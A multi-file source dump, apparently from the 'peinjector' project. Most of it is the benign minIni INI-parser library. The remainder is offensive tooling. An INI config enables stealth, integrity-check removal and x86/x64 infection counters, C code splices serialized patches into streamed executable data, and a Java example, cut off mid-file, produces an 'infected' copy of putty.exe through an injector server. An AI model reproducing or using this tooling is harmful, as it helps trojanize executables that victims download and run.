 * \param Buffer      a pointer to the buffer to copy into
 * \param BufferSize  the maximum number of characters to copy
 * \param Filename    the name and full path of the .ini file to read from
 *
 * A true boolean is found if one of the following is matched:
 * - A string starting with 'y' or 'Y'
 * - A string starting with 't' or 'T'
 * - A string starting with '1'
 *
 * A false boolean is found if one of the following is matched:
 * - A string starting with 'n' or 'N'
 * - A string starting with 'f' or 'F'
 * - A string starting with '0'
 *
 * \return            the true/false flag as interpreted at Key
 */
int ini_getbool(const TCHAR *Section, const TCHAR *Key, int DefValue, const TCHAR *Filename)
{
  TCHAR LocalBuffer[2] = __T("");
  int ret;

  ini_gets(Section, Key, __T(""), LocalBuffer, sizearray(LocalBuffer), Filename);
  LocalBuffer[0] = (TCHAR)_totupper((int)LocalBuffer[0]);
  if (LocalBuffer[0] == 'Y' || LocalBuffer[0] == '1' || LocalBuffer[0] == 'T')
    ret = 1;
  else if (LocalBuffer[0] == 'N' || LocalBuffer[0] == '0' || LocalBuffer[0] == 'F')
    ret = 0;
  else
    ret = DefValue;

  return(ret);
}

/** ini_getsection()
 * \param idx         the zero-based sequence number of the section to return
 * \param Buffer      a pointer to the buffer to copy into
 * \param BufferSize  the maximum number of characters to copy
 * \param Filename    the name and full path of the .ini file to read from
 *
 * \return            the number of characters copied into the supplied buffer
 */
int  ini_getsection(int idx, TCHAR *Buffer, int BufferSize, const TCHAR *Filename)
{
  INI_FILETYPE fp;
  int ok = 0;

  if (Buffer == NULL || BufferSize <= 0 || idx < 0)
    return 0;
  if (ini_openread(Filename, &fp)) {
    ok = getkeystring(&fp, NULL, NULL, idx, -1, Buffer, BufferSize, NULL);
    (void)ini_close(&fp);
  } /* if */
  if (!ok)
    *Buffer = '\0';
  return (int)_tcslen(Buffer);
}

/** ini_getkey()
 * \param Section     the name of the section to browse through, or NULL to
 *                    browse through the keys outside any section
 * \param idx         the zero-based sequence number of the key to return
 * \param Buffer      a pointer to the buffer to copy into
 * \param BufferSize  the maximum number of characters to copy
 * \param Filename    the name and full path of the .ini file to read from
 *
 * \return            the number of characters copied into the supplied buffer
 */
int  ini_getkey(const TCHAR *Section, int idx, TCHAR *Buffer, int BufferSize, const TCHAR *Filename)
{
  INI_FILETYPE fp;
  int ok = 0;

  if (Buffer == NULL || BufferSize <= 0 || idx < 0)
    return 0;
  if (ini_openread(Filename, &fp)) {
    ok = getkeystring(&fp, Section, NULL, -1, idx, Buffer, BufferSize, NULL);
    (void)ini_close(&fp);
  } /* if */
  if (!ok)
    *Buffer = '\0';
  return (int)_tcslen(Buffer);
}


#if !defined INI_NOBROWSE
/** ini_browse()
 * \param Callback    a pointer to a function that will be called for every
 *                    setting in the INI file.
 * \param UserData    arbitrary data, which the function passes on the the
 *                    \c Callback function
 * \param Filename    the name and full path of the .ini file to read from
 *
 * \return            1 on success, 0 on failure (INI file not found)
 *
 * \note              The \c Callback function must return 1 to continue
 *                    browsing through the INI file, or 0 to stop. Even when the
 *                    callback stops the browsing, this function will return 1
 *                    (for success).
 */
int  ini_browse(INI_CALLBACK Callback, const void *UserData, const TCHAR *Filename)
{
  TCHAR LocalBuffer[INI_BUFFERSIZE];
  int lenSec, lenKey;
  enum quote_option quotes;
  INI_FILETYPE fp;

  if (Callback == NULL)
    return 0;
  if (!ini_openread(Filename, &fp))
    return 0;

  LocalBuffer[0] = '\0';   /* copy an empty section in the buffer */
  lenSec = (int)_tcslen(LocalBuffer) + 1;
  for ( ;; ) {
    TCHAR *sp, *ep;
    if (!ini_read(LocalBuffer + lenSec, INI_BUFFERSIZE - lenSec, &fp))
      break;
    sp = skipleading(LocalBuffer + lenSec);
    /* ignore empty strings and comments */
    if (*sp == '\0' || *sp == ';' || *sp == '#')
      continue;
    /* see whether we reached a new section */
    ep = _tcschr(sp, ']');
    if (*sp == '[' && ep != NULL) {
      *ep = '\0';
      save_strncpy(LocalBuffer, sp + 1, INI_BUFFERSIZE, QUOTE_NONE);
      lenSec = (int)_tcslen(LocalBuffer) + 1;
      continue;
    } /* if */
    /* not a new section, test for a key/value pair */
    ep = _tcschr(sp, '=');    /* test for the equal sign or colon */
    if (ep == NULL)
      ep = _tcschr(sp, ':');
    if (ep == NULL)
      continue;               /* invalid line, ignore */
    *ep++ = '\0';             /* split the key from the value */
    striptrailing(sp);
    save_strncpy(LocalBuffer + lenSec, sp, INI_BUFFERSIZE - lenSec, QUOTE_NONE);
    lenKey = (int)_tcslen(LocalBuffer + lenSec) + 1;
    /* clean up the value */
    sp = skipleading(ep);
    sp = cleanstring(sp, &quotes);  /* Remove a trailing comment */
    save_strncpy(LocalBuffer + lenSec + lenKey, sp, INI_BUFFERSIZE - lenSec - lenKey, quotes);
    /* call the callback */
    if (!Callback(LocalBuffer, LocalBuffer + lenSec, LocalBuffer + lenSec + lenKey, UserData))
      break;
  } /* for */

  (void)ini_close(&fp);
  return 1;
}
#endif /* INI_NOBROWSE */

#if ! defined INI_READONLY
static void ini_tempname(TCHAR *dest, const TCHAR *source, int maxlength)
{
  TCHAR *p;

  save_strncpy(dest, source, maxlength, QUOTE_NONE);
  p = _tcsrchr(dest, '\0');
  assert(p != NULL);
  *(p - 1) = '~';
}

static enum quote_option check_enquote(const TCHAR *Value)
{
  const TCHAR *p;

  /* run through the value, if it has trailing spaces, or '"', ';' or '#'
   * characters, enquote it
   */
  assert(Value != NULL);
  for (p = Value; *p != '\0' && *p != '"' && *p != ';' && *p != '#'; p++)
    /* nothing */;
  return (*p != '\0' || (p > Value && *(p - 1) == ' ')) ? QUOTE_ENQUOTE : QUOTE_NONE;
}

static void writesection(TCHAR *LocalBuffer, const TCHAR *Section, INI_FILETYPE *fp)
{
  if (Section != NULL && _tcslen(Section) > 0) {
    TCHAR *p;
    LocalBuffer[0] = '[';
    save_strncpy(LocalBuffer + 1, Section, INI_BUFFERSIZE - 4, QUOTE_NONE);  /* -1 for '[', -1 for ']', -2 for '\r\n' */
    p = _tcsrchr(LocalBuffer, '\0');
    assert(p != NULL);
    *p++ = ']';
    _tcscpy(p, INI_LINETERM); /* copy line terminator (typically "\n") */
    if (fp != NULL)
      (void)ini_write(LocalBuffer, fp);
  } /* if */
}

static void writekey(TCHAR *LocalBuffer, const TCHAR *Key, const TCHAR *Value, INI_FILETYPE *fp)
{
  TCHAR *p;
  enum quote_option option = check_enquote(Value);
  save_strncpy(LocalBuffer, Key, INI_BUFFERSIZE - 3, QUOTE_NONE);  /* -1 for '=', -2 for '\r\n' */
  p = _tcsrchr(LocalBuffer, '\0');
  assert(p != NULL);
  *p++ = '=';
  save_strncpy(p, Value, INI_BUFFERSIZE - (p - LocalBuffer) - 2, option); /* -2 for '\r\n' */
  p = _tcsrchr(LocalBuffer, '\0');
  assert(p != NULL);
  _tcscpy(p, INI_LINETERM); /* copy line terminator (typically "\n") */
  if (fp != NULL)
    (void)ini_write(LocalBuffer, fp);
}

static int cache_accum(const TCHAR *string, int *size, int max)
{
  int len = (int)_tcslen(string);
  if (*size + len >= max)
    return 0;
  *size += len;
  return 1;
}

static int cache_flush(TCHAR *buffer, int *size,
                      INI_FILETYPE *rfp, INI_FILETYPE *wfp, INI_FILEPOS *mark)
{
  int terminator_len = (int)_tcslen(INI_LINETERM);
  int pos = 0;

  (void)ini_seek(rfp, mark);
  assert(buffer != NULL);
  buffer[0] = '\0';
  assert(size != NULL);
  assert(*size <= INI_BUFFERSIZE);
  while (pos < *size) {
    (void)ini_read(buffer + pos, INI_BUFFERSIZE - pos, rfp);
    while (pos < *size && buffer[pos] != '\0')
      pos++;            /* cannot use _tcslen() because buffer may not be zero-terminated */
  } /* while */
  if (buffer[0] != '\0') {
    assert(pos > 0 && pos <= INI_BUFFERSIZE);
    if (pos == INI_BUFFERSIZE)
      pos--;
    buffer[pos] = '\0'; /* force zero-termination (may be left unterminated in the above while loop) */
    (void)ini_write(buffer, wfp);
  }
  ini_tell(rfp, mark);  /* update mark */
  *size = 0;
  /* return whether the buffer ended with a line termination */
  return (pos > terminator_len) && (_tcscmp(buffer + pos - terminator_len, INI_LINETERM) == 0);
}

static int close_rename(INI_FILETYPE *rfp, INI_FILETYPE *wfp, const TCHAR *filename, TCHAR *buffer)
{
  (void)ini_close(rfp);
  (void)ini_close(wfp);
  (void)ini_remove(filename);
  (void)ini_tempname(buffer, filename, INI_BUFFERSIZE);
  (void)ini_rename(buffer, filename);
  return 1;
}

/** ini_puts()
 * \param Section     the name of the section to write the string in
 * \param Key         the name of the entry to write, or NULL to erase all keys in the section
 * \param Value       a pointer to the buffer the string, or NULL to erase the key
 * \param Filename    the name and full path of the .ini file to write to
 *
 * \return            1 if successful, otherwise 0
 */
int ini_puts(const TCHAR *Section, const TCHAR *Key, const TCHAR *Value, const TCHAR *Filename)
{
  INI_FILETYPE rfp;
  INI_FILETYPE wfp;
  INI_FILEPOS mark;
  INI_FILEPOS head, tail;
  TCHAR *sp, *ep;
  TCHAR LocalBuffer[INI_BUFFERSIZE];
  int len, match, flag, cachelen;

  assert(Filename != NULL);
  if (!ini_openread(Filename, &rfp)) {
    /* If the .ini file doesn't exist, make a new file */
    if (Key != NULL && Value != NULL) {
      if (!ini_openwrite(Filename, &wfp))
        return 0;
      writesection(LocalBuffer, Section, &wfp);
      writekey(LocalBuffer, Key, Value, &wfp);
      (void)ini_close(&wfp);
    } /* if */
    return 1;
  } /* if */

  /* If parameters Key and Value are valid (so this is not an "erase" request)
   * and the setting already exists, there are two short-cuts to avoid rewriting
   * the INI file.
   */
  if (Key != NULL && Value != NULL) {
    ini_tell(&rfp, &mark);
    match = getkeystring(&rfp, Section, Key, -1, -1, LocalBuffer, sizearray(LocalBuffer), &head);
    if (match) {
      /* if the current setting is identical to the one to write, there is
       * nothing to do.
       */
      if (_tcscmp(LocalBuffer,Value) == 0) {
        (void)ini_close(&rfp);
        return 1;
      } /* if */
      /* if the new setting has the same length as the current setting, and the
       * glue file permits file read/write access, we can modify in place.
       */
      #if defined ini_openrewrite
        /* we already have the start of the (raw) line, get the end too */
        ini_tell(&rfp, &tail);
        /* create new buffer (without writing it to file) */
        writekey(LocalBuffer, Key, Value, NULL);
        if (_tcslen(LocalBuffer) == (size_t)(tail - head)) {
          /* length matches, close the file & re-open for read/write, then
           * write at the correct position
           */
          (void)ini_close(&rfp);
          if (!ini_openrewrite(Filename, &wfp))
            return 0;
          (void)ini_seek(&wfp, &head);
          (void)ini_write(LocalBuffer, &wfp);
          (void)ini_close(&wfp);
          return 1;
        } /* if */
      #endif
    } /* if */
    /* key not found, or different value & length -> proceed (but rewind the
     * input file first)
     */
    (void)ini_seek(&rfp, &mark);
  } /* if */

  /* Get a temporary file name to copy to. Use the existing name, but with
   * the last character set to a '~'.
   */
  ini_tempname(LocalBuffer, Filename, INI_BUFFERSIZE);
  if (!ini_openwrite(LocalBuffer, &wfp)) {
    (void)ini_close(&rfp);
    return 0;
  } /* if */
  ini_tell(&rfp, &mark);
  cachelen = 0;

  /* Move through the file one line at a time until a section is
   * matched or until EOF. Copy to temp file as it is read.
   */
  len = (Section != NULL) ? (int)_tcslen(Section) : 0;
  if (len > 0) {
    do {
      if (!ini_read(LocalBuffer, INI_BUFFERSIZE, &rfp)) {
        /* Failed to find section, so add one to the end */
        flag = cache_flush(LocalBuffer, &cachelen, &rfp, &wfp, &mark);
        if (Key!=NULL && Value!=NULL) {
          if (!flag)
            (void)ini_write(INI_LINETERM, &wfp);  /* force a new line behind the last line of the INI file */
          writesection(LocalBuffer, Section, &wfp);
          writekey(LocalBuffer, Key, Value, &wfp);
        } /* if */
        return close_rename(&rfp, &wfp, Filename, LocalBuffer);  /* clean up and rename */
      } /* if */
      /* Copy the line from source to dest, but not if this is the section that
       * we are looking for and this section must be removed
       */
      sp = skipleading(LocalBuffer);
      ep = _tcschr(sp, ']');
      match = (*sp == '[' && ep != NULL && (int)(ep-sp-1) == len && _tcsnicmp(sp + 1,Section,len) == 0);
      if (!match || Key != NULL) {
        if (!cache_accum(LocalBuffer, &cachelen, INI_BUFFERSIZE)) {
          cache_flush(LocalBuffer, &cachelen, &rfp, &wfp, &mark);
          (void)ini_read(LocalBuffer, INI_BUFFERSIZE, &rfp);
          cache_accum(LocalBuffer, &cachelen, INI_BUFFERSIZE);
        } /* if */
      } /* if */
    } while (!match);
  } /* if */
  cache_flush(LocalBuffer, &cachelen, &rfp, &wfp, &mark);
  /* when deleting a section, the section head that was just found has not been
   * copied to the output file, but because this line was not "accumulated" in
   * the cache, the position in the input file was reset to the point just
   * before the section; this must now be skipped (again)
   */
  if (Key == NULL) {
    (void)ini_read(LocalBuffer, INI_BUFFERSIZE, &rfp);
    ini_tell(&rfp, &mark);
  } /* if */

  /* Now that the section has been found, find the entry. Stop searching
   * upon leaving the section's area. Copy the file as it is read
   * and create an entry if one is not found.
   */
  len = (Key != NULL) ? (int)_tcslen(Key) : 0;
  for( ;; ) {
    if (!ini_read(LocalBuffer, INI_BUFFERSIZE, &rfp)) {
      /* EOF without an entry so make one */
      flag = cache_flush(LocalBuffer, &cachelen, &rfp, &wfp, &mark);
      if (Key!=NULL && Value!=NULL) {
        if (!flag)
          (void)ini_write(INI_LINETERM, &wfp);  /* force a new line behind the last line of the INI file */
        writekey(LocalBuffer, Key, Value, &wfp);
      } /* if */
      return close_rename(&rfp, &wfp, Filename, LocalBuffer);  /* clean up and rename */
    } /* if */
    sp = skipleading(LocalBuffer);
    ep = _tcschr(sp, '='); /* Parse out the equal sign */
    if (ep == NULL)
      ep = _tcschr(sp, ':');
    match = (ep != NULL && len > 0 && (int)(skiptrailing(ep,sp)-sp) == len && _tcsnicmp(sp,Key,len) == 0);
    if ((Key != NULL && match) || *sp == '[')
      break;  /* found the key, or found a new section */
    /* copy other keys in the section */
    if (Key == NULL) {
      ini_tell(&rfp, &mark);  /* we are deleting the entire section, so update the read position */
    } else {
      if (!cache_accum(LocalBuffer, &cachelen, INI_BUFFERSIZE)) {
        cache_flush(LocalBuffer, &cachelen, &rfp, &wfp, &mark);
        (void)ini_read(LocalBuffer, INI_BUFFERSIZE, &rfp);
        cache_accum(LocalBuffer, &cachelen, INI_BUFFERSIZE);
      } /* if */
    } /* if */
  } /* for */
  /* the key was found, or we just dropped on the next section (meaning that it
   * wasn't found); in both cases we need to write the key, but in the latter
   * case, we also need to write the line starting the new section after writing
   * the key
   */
  flag = (*sp == '[');
  cache_flush(LocalBuffer, &cachelen, &rfp, &wfp, &mark);
  if (Key != NULL && Value != NULL)
    writekey(LocalBuffer, Key, Value, &wfp);
  /* cache_flush() reset the "read pointer" to the start of the line with the
   * previous key or the new section; read it again (because writekey() destroyed
   * the buffer)
   */
  (void)ini_read(LocalBuffer, INI_BUFFERSIZE, &rfp);
  if (flag) {
    /* the new section heading needs to be copied to the output file */
    cache_accum(LocalBuffer, &cachelen, INI_BUFFERSIZE);
  } else {
    /* forget the old key line */
    ini_tell(&rfp, &mark);
  } /* if */
  /* Copy the rest of the INI file */
  while (ini_read(LocalBuffer, INI_BUFFERSIZE, &rfp)) {
    if (!cache_accum(LocalBuffer, &cachelen, INI_BUFFERSIZE)) {
      cache_flush(LocalBuffer, &cachelen, &rfp, &wfp, &mark);
      (void)ini_read(LocalBuffer, INI_BUFFERSIZE, &rfp);
      cache_accum(LocalBuffer, &cachelen, INI_BUFFERSIZE);
    } /* if */
  } /* while */
  cache_flush(LocalBuffer, &cachelen, &rfp, &wfp, &mark);
  return close_rename(&rfp, &wfp, Filename, LocalBuffer);  /* clean up and rename */
}

/* Ansi C "itoa" based on Kernighan & Ritchie's "Ansi C" book. */
#define ABS(v)  ((v) < 0 ? -(v) : (v))

static void strreverse(TCHAR *str)
{
  int i, j;
  for (i = 0, j = (int)_tcslen(str) - 1; i < j; i++, j--) {
    TCHAR t = str[i];
    str[i] = str[j];
    str[j] = t;
  } /* for */
}

static void long2str(long value, TCHAR *str)
{
  int i = 0;
  long sign = value;
  int n;

  /* generate digits in reverse order */
  do {
    n = (int)(value % 10);              /* get next lowest digit */
    str[i++] = (TCHAR)(ABS(n) + '0');   /* handle case of negative digit */
  } while (value /= 10);                /* delete the lowest digit */
  if (sign < 0)
    str[i++] = '-';
  str[i] = '\0';

  strreverse(str);
}

/** ini_putl()
 * \param Section     the name of the section to write the value in
 * \param Key         the name of the entry to write
 * \param Value       the value to write
 * \param Filename    the name and full path of the .ini file to write to
 *
 * \return            1 if successful, otherwise 0
 */
int ini_putl(const TCHAR *Section, const TCHAR *Key, long Value, const TCHAR *Filename)
{
  TCHAR LocalBuffer[32];
  long2str(Value, LocalBuffer);
  return ini_puts(Section, Key, LocalBuffer, Filename);
}

#if defined INI_REAL
/** ini_putf()
 * \param Section     the name of the section to write the value in
 * \param Key         the name of the entry to write
 * \param Value       the value to write
 * \param Filename    the name and full path of the .ini file to write to
 *
 * \return            1 if successful, otherwise 0
 */
int ini_putf(const TCHAR *Section, const TCHAR *Key, INI_REAL Value, const TCHAR *Filename)
{
  TCHAR LocalBuffer[64];
  ini_ftoa(LocalBuffer, Value);
  return ini_puts(Section, Key, LocalBuffer, Filename);
}
#endif /* INI_REAL */
#endif /* !INI_READONLY */

```

`peinjector/3rdparty/ini/minIni.h`:

```h
/*  minIni - Multi-Platform INI file parser, suitable for embedded systems
 *
 *  Copyright (c) CompuPhase, 2008-2015
 *
 *  Licensed under the Apache License, Version 2.0 (the "License"); you may not
 *  use this file except in compliance with the License. You may obtain a copy
 *  of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
 *  WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
 *  License for the specific language governing permissions and limitations
 *  under the License.
 *
 *  Version: $Id: minIni.h 53 2015-01-18 13:35:11Z thiadmer.riemersma@gmail.com $
 */
#ifndef MININI_H
#define MININI_H

#include "minGlue.h"

#if (defined _UNICODE || defined __UNICODE__ || defined UNICODE) && !defined INI_ANSIONLY
  #include <tchar.h>
  #define mTCHAR TCHAR
#else
  /* force TCHAR to be "char", but only for minIni */
  #define mTCHAR char
#endif

#if !defined INI_BUFFERSIZE
  #define INI_BUFFERSIZE  512
#endif

#if defined __cplusplus
  extern "C" {
#endif

int   ini_getbool(const mTCHAR *Section, const mTCHAR *Key, int DefValue, const mTCHAR *Filename);
long  ini_getl(const mTCHAR *Section, const mTCHAR *Key, long DefValue, const mTCHAR *Filename);
int   ini_gets(const mTCHAR *Section, const mTCHAR *Key, const mTCHAR *DefValue, mTCHAR *Buffer, int BufferSize, const mTCHAR *Filename);
int   ini_getsection(int idx, mTCHAR *Buffer, int BufferSize, const mTCHAR *Filename);
int   ini_getkey(const mTCHAR *Section, int idx, mTCHAR *Buffer, int BufferSize, const mTCHAR *Filename);

#if defined INI_REAL
INI_REAL ini_getf(const mTCHAR *Section, const mTCHAR *Key, INI_REAL DefValue, const mTCHAR *Filename);
#endif

#if !defined INI_READONLY
int   ini_putl(const mTCHAR *Section, const mTCHAR *Key, long Value, const mTCHAR *Filename);
int   ini_puts(const mTCHAR *Section, const mTCHAR *Key, const mTCHAR *Value, const mTCHAR *Filename);
#if defined INI_REAL
int   ini_putf(const mTCHAR *Section, const mTCHAR *Key, INI_REAL Value, const mTCHAR *Filename);
#endif
#endif /* INI_READONLY */

#if !defined INI_NOBROWSE
typedef int (*INI_CALLBACK)(const mTCHAR *Section, const mTCHAR *Key, const mTCHAR *Value, const void *UserData);
int  ini_browse(INI_CALLBACK Callback, const void *UserData, const mTCHAR *Filename);
#endif /* INI_NOBROWSE */

#if defined __cplusplus
  }
#endif


#if defined __cplusplus

#if defined __WXWINDOWS__
	#include "wxMinIni.h"
#else
  #include <string>

  /* The C++ class in minIni.h was contributed by Steven Van Ingelgem. */
  class minIni
  {
  public:
    minIni(const std::string& filename) : iniFilename(filename)
      { }

    bool getbool(const std::string& Section, const std::string& Key, bool DefValue=false) const
      { return ini_getbool(Section.c_str(), Key.c_str(), int(DefValue), iniFilename.c_str()) != 0; }

    long getl(const std::string& Section, const std::string& Key, long DefValue=0) const
      { return ini_getl(Section.c_str(), Key.c_str(), DefValue, iniFilename.c_str()); }

    int geti(const std::string& Section, const std::string& Key, int DefValue=0) const
      { return static_cast<int>(this->getl(Section, Key, long(DefValue))); }

    std::string gets(const std::string& Section, const std::string& Key, const std::string& DefValue="") const
      {
        char buffer[INI_BUFFERSIZE];
        ini_gets(Section.c_str(), Key.c_str(), DefValue.c_str(), buffer, INI_BUFFERSIZE, iniFilename.c_str());
        return buffer;
      }

    std::string getsection(int idx) const
      {
        char buffer[INI_BUFFERSIZE];
        ini_getsection(idx, buffer, INI_BUFFERSIZE, iniFilename.c_str());
        return buffer;
      }

    std::string getkey(const std::string& Section, int idx) const
      {
        char buffer[INI_BUFFERSIZE];
        ini_getkey(Section.c_str(), idx, buffer, INI_BUFFERSIZE, iniFilename.c_str());
        return buffer;
      }

#if defined INI_REAL
    INI_REAL getf(const std::string& Section, const std::string& Key, INI_REAL DefValue=0) const
      { return ini_getf(Section.c_str(), Key.c_str(), DefValue, iniFilename.c_str()); }
#endif

#if ! defined INI_READONLY
    bool put(const std::string& Section, const std::string& Key, long Value) const
      { return ini_putl(Section.c_str(), Key.c_str(), Value, iniFilename.c_str()) != 0; }

    bool put(const std::string& Section, const std::string& Key, int Value) const
      { return ini_putl(Section.c_str(), Key.c_str(), (long)Value, iniFilename.c_str()) != 0; }

    bool put(const std::string& Section, const std::string& Key, bool Value) const
      { return ini_putl(Section.c_str(), Key.c_str(), (long)Value, iniFilename.c_str()) != 0; }

    bool put(const std::string& Section, const std::string& Key, const std::string& Value) const
      { return ini_puts(Section.c_str(), Key.c_str(), Value.c_str(), iniFilename.c_str()) != 0; }

    bool put(const std::string& Section, const std::string& Key, const char* Value) const
      { return ini_puts(Section.c_str(), Key.c_str(), Value, iniFilename.c_str()) != 0; }

#if defined INI_REAL
    bool put(const std::string& Section, const std::string& Key, INI_REAL Value) const
      { return ini_putf(Section.c_str(), Key.c_str(), Value, iniFilename.c_str()) != 0; }
#endif

    bool del(const std::string& Section, const std::string& Key) const
      { return ini_puts(Section.c_str(), Key.c_str(), 0, iniFilename.c_str()) != 0; }

    bool del(const std::string& Section) const
      { return ini_puts(Section.c_str(), 0, 0, iniFilename.c_str()) != 0; }
#endif

  private:
    std::string iniFilename;
  };

#endif /* __WXWINDOWS__ */
#endif /* __cplusplus */

#endif /* MININI_H */

```

`peinjector/config.ini`:

```ini
; INI-Config-File 
; 0 = false, 1 = true

[name]
section_name=default
section_name_random=1
payload_name_x86=default
payload_name_x64=default

[methods]
method_alignment=1
method_alignment_resize=1
method_new_section=1
method_change_flags=1

[integrity]
remove_integrity_check=1
try_stay_stealth=1

[server]
data_port=31337
data_interface=0
control_port=31338
control_interface=0
enable=1

[statistics]
infection_counter_x86=0
infection_counter_x64=0
```

`peinjector/connectors/c/libpepatch.c`:

```c
/*
 * \file   libpepatch.c
 * \author A.A.
 * \brief  Deserializes and applies patches on stream data
 */

#include <stdlib.h>
#include <string.h>
#include "libpepatch.h"

/* Min/Max Macros */
#define MIN(_a, _b) ((_a) < (_b) ? (_a) : (_b))
#define MAX(_a, _b) ((_a) > (_b) ? (_a) : (_b))

/* Adds new patch part */
static inline PEPATCH *__peinfect_add_patch_part(PEPATCH *parent) {
  PEPATCH *new_patch = calloc(1, sizeof(PEPATCH));
  parent->next = new_patch;

  return new_patch;
}

/* Add memory patch part */
static inline PEPATCH *__peinfect_add_patch_memory(PEPATCH *parent, void *mem, size_t memsize, size_t position,
bool insert) {
  parent->position = position;
  parent->memsize = memsize;
  parent->mem = malloc(parent->memsize);
  parent->insert = insert;

  /* Couldn't allocate memory */
  if (parent->mem == NULL) {
    return NULL;
  }

  /* Copy patch memory*/
  memcpy(parent->mem, mem, parent->memsize);

  /* Return next part*/
  return __peinfect_add_patch_part(parent);
}

bool pepatch_load(unsigned char *mem, size_t memsize, PEPATCH *out) {
  uint32_t *patch_memsize = (uint32_t *) mem;
  uint32_t total_partsize;
  PEPATCH *current = out;

  /* Memory buffer to small */
  if (memsize < (2 * sizeof(uint32_t) + sizeof(uint8_t))) {
    return false;
  }

  while (memsize) {
    /* Total size of serialized patch part */
    total_partsize = 2 * sizeof(uint32_t) + sizeof(uint8_t) + *patch_memsize;
    if (memsize >= total_partsize) {

      /* Sentinel patch part == 0*/
      if (*patch_memsize > 0) {
        /* Add patch part */
        current = __peinfect_add_patch_memory(current, mem + 2 * sizeof(uint32_t) + sizeof(uint8_t), *patch_memsize,
            *(uint32_t *) (mem + sizeof(uint32_t)), *(uint8_t *) (mem + 2 * sizeof(uint32_t)));

        /* Couldn't add patch part */
        if (current == NULL) {
          pepatch_free(out);
          return false;
        }
      }

      /* Adjust memory and memsize */
      mem += total_partsize;
      patch_memsize = (uint32_t *) mem;
      memsize -= total_partsize;

    } else {
      /* Invalid patch memory */
      pepatch_free(out);
      return false;

    }
  }

  return true;
}

bool pepatch_apply(PEPATCH *in, unsigned char **mem, size_t *memsize, size_t position) {
  PEPATCH *current = in;
  size_t delta_position;
  bool all_finished = true;

  /* No need to patch anything */
  if (mem == NULL || *mem == NULL || in->memsize == 0) {
    return true;
  }

  /* For each patch part */
  while (current) {

    /* Finished, no need to check */
    if (current->finished) {
      current = current->next;
      continue;
    }

    /* start position of current patch part in stream memory */
    if ((current->position >= position) && (current->position < position + *memsize)) {
      /* delta memory position */
      delta_position = current->position - position;

      /* insert memory */
      if (current->insert) {
        *mem = realloc(*mem, *memsize + current->memsize);
        if (*mem == NULL) {
          return false;
        }
        /* move memory */
        memmove(*mem + delta_position + current->memsize, *mem + delta_position, *memsize - delta_position);
        /* copy patch memory */
        memcpy(*mem + delta_position, current->mem, current->memsize);
        /* new mem size */
        *memsize += current->memsize;

        /* Patch finished */
        current->finished = true;

        /* overwrite */
      } else {
        memcpy(*mem + delta_position, current->mem, MIN(current->memsize, *memsize - delta_position));
      }

      /* Patch applied */
      all_finished = false;

      /* Append after current mem part (important if current part is the last part) */
    } else if (current->insert && (current->position == (position + *memsize))) {
      /* Insert at the end */
      *mem = realloc(*mem, *memsize + current->memsize);
      if (*mem == NULL) {
        return false;
      }
      /* copy patch memory */
      memcpy(*mem + *memsize, current->mem, current->memsize);
      /* new mem size */
      *memsize += current->memsize;

      /* Patch finished */
      current->finished = true;

      /* Patch applied */
      all_finished = false;

      /* end position of current patch part in stream memory or patch part bigger than stream memory */
    } else if (!current->insert && ((current->position + current->memsize) > position)
        && (current->position < position)) {
      /* delta memory position */
      delta_position = position - current->position;
      /* overwrite */
      memcpy(*mem, current->mem + delta_position, MIN(current->memsize - delta_position, *memsize));

      /* Patch applied */
      all_finished = false;

      /* Patch finished */
    } else if ((current->position + current->memsize) < position) {
      current->finished = true;

      /* Patch waiting, reset total finished  */
    } else {
      all_finished = false;
    }

    /* select next part */
    current = current->next;
  }

  /* Patch finished */
  if (all_finished) {
    in->memsize = 0;
  }

  return true;
}

void pepatch_free(PEPATCH *in) {
  PEPATCH *current = in;

  while (current != NULL) {
    /* Free memory */
    if (current->mem != NULL) {
      free(current->mem);
    }

    /* Free element if not first element*/
    if (current != in) {
      free(current);
    }

    /* Next element */
    current = current->next;
  }
}

```

`peinjector/connectors/c/libpepatch.h`:

```h
/**
 * \file   libpepatch.h
 * \author A.A.
 * \brief  Deserializes and applies patches on stream data
 */

#ifndef CONNECTORS_LIBPEPATCH_H_
#define CONNECTORS_LIBPEPATCH_H_

#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>

/**
 * Sentinel size of serialized patch
 */
#define PEPATCH_SENTINELSIZE 9

/**
 * PEPATCH structure
 */
typedef struct _PEPATCH {
  unsigned char *mem;    //!< Pointer to memory of current patch part
  size_t memsize;        //!< Size of current patch part
  size_t position;       //!< Position of current patch part
  bool insert;           //!< If true patch will be inserted, overwritten otherwise
  struct _PEPATCH *next; //!< Pointer to next patch part
  bool finished;         //!< Patch part fully applied
} PEPATCH;


/**
 * Tries to load a patch from serialized data
 *
 * \param mem     Imput memory
 * \param memsize Size of memory
 * \param out     Output PEPATCH
 *
 * \return true on success, false otherwise
 */
bool pepatch_load(unsigned char *mem, size_t memsize, PEPATCH *out);

/**
 * Tries to apply an patch onto a given memory stream part
 *
 * \param in       Input PEPATCH
 * \param mem      Memory to patch
 * \param memsize  Size of memory
 * \param position Postion of memory in stream
 *
 * \return true on success, false otherwise
 */
bool pepatch_apply(PEPATCH *in, unsigned char **mem, size_t *memsize, size_t position);

/**
 * Clears PEPATCH structure
 *
 * \param in Input PEPATCH structure
 */
void pepatch_free(PEPATCH *in);

#endif /* CONNECTORS_LIBPEPATCH_H_ */

```

`peinjector/connectors/java/eu/peinjector/example/EXAMPLE.java`:

```java
package eu.peinjector.example;

import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;

import eu.peinjector.libpe.LibPeControlProtocol;
import eu.peinjector.libpe.LibPeDataProtocol;
import eu.peinjector.libpe.LibPePatch;
import eu.peinjector.libpe.LibPeServerConfig;
import eu.peinjector.libpe.LibPeShellcodeFactory;
import eu.peinjector.libpe.exceptions.LibPeProtocolException;
import eu.peinjector.libpe.exceptions.LibPeBadInputException;
import eu.peinjector.libpe.exceptions.LibPeSocketException;

public class EXAMPLE {

	public static void main(String[] args) {

		// change me
		//-----------------------------------------
		String peinjectorserver = "192.168.0.111";
		int controlPort 		= 31338;
		int dataPort 			= 31337;
		String sourceFile 		= "D:/putty.exe";
		String infectFile 		= "D:/putty2.exe";
		
		
		// example
		//-----------------------------------------
		
		//LibPeControlProtocol to manage the pe-injector
		LibPeControlProtocol control = new LibPeControlProtocol();
		
		//LibPeDataProtocol to send pe-header to the pe-injector and get patches
